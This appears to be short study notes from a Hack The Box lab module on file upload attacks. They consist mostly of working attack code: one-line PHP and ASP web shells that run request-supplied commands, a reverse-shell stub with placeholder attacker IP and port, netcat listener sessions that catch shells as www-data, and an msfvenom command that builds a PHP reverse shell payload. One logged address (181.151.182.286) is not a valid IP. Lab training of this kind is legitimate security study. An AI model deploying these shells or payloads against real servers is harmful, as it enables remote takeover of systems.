#### 

#### File Upload Attacks

### Upload Exploitation

# Web Shells

## Writing Custom Web Shell

```php
<?php system($_REQUEST['cmd']); ?>
```

```asp
<% eval request('cmd') %>
```

## Reverse Shell

```php
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS
```

```bash
ndefstathiou@htb[/htb]$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [188.166.173.208] 35232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Generating Custom Reverse Shell Scripts

```bash
ndefstathiou@htb[/htb]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
...SNIP...
Payload size: 3033 bytes
```

```bash
ndefstathiou@htb[/htb]$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [181.151.182.286] 56232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 

# 

### Questions

